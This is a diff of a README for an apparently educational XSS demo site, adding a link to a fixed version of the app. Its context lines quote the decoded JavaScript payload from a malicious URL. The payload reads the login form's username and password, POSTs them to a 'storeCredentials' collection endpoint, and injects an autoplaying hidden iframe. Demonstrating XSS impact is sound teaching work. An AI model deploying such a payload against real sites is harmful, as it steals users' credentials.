@@ -21,6 +21,7 @@ To get started, navigate to No Man's Land Revenue Agency home page: [https://mts
 ## Notes
 - Created for educational purposes only and to demonstrate how bad XSS vulnerabilities can be
 - Recommended browser engine: Chromium (Chrome). Gecko (Firefox) might also work but it has not been tested and WebKit (Safari) is not recommended due to odd behavior
+- The app that has those XSS vulnerabilities fixed can be found at the following URL: [https://mtsanovv.github.io/nomanslandra/frontendInvulnerable/index.html](https://mtsanovv.github.io/nomanslandra/frontendInvulnerable/index.html)
 - This is the unencoded JavaScript code for the 'continue' parameter in the malicious URL:
 ```$.ajax({contentType:'application/json',type:'POST',url:'http://localhost:3000/storeCredentials',data:JSON.stringify({username:$('input:eq(0)').val(),password:$("input:eq(1)").val()})});$("article").first().append('<img src="https://media.tenor.com/7XnVtgeQv4EAAAAC/money-pool-rich.gif"/><iframe width="1" height="1" src="https://www.youtube.com/embed/_w7Ft_JTbH4?autoplay=1"></iframe>');console.log```
 - The website is based on Telephasic by HTML5UP!
